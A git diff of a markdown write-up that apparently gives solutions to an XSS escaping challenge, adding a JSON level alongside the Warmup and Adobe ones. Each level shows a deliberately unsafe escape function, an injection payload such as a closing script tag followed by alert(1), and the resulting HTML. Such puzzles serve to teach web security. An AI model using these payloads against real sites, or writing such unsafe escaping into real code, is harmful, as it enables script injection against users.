@@ -4,7 +4,7 @@
 
 > The code below generates HTML in an unsafe way. Prove it by calling `alert(1)`.
 
-## Warmup
+## Warmup ✅
 
 ```js
 function escape(s) {
@@ -12,19 +12,19 @@ function escape(s) {
 }
 ```
 
-### Input (12)
+#### Input (12)
 
 ```
 ",alert(1),"
 ```
 
-### Output
+#### Output
 
 ```html
 <script>console.log("",alert(1),"");</script>
 ```
 
-## Adobe
+## Adobe ✅
 
 ```js
 function escape(s) {
@@ -33,14 +33,35 @@ function escape(s) {
 }
 ```
 
-### Input (14)
+#### Input (14)
 
 ```
 \",alert(1))//
 ```
 
-### Output
+#### Output
 
 ```html
 <script>console.log("\\",alert(1))//");</script>
+```
+
+## JSON ✅
+
+```js
+function escape(s) {
+  s = JSON.stringify(s);
+  return '<script>console.log(' + s + ');</script>';
+}
+```
+
+#### Input (27)
+
+```
+</script><script>alert(1)//
+```
+
+#### Output
+
+```html
+<script>console.log("</script><script>alert(1)//");</script>
 ```
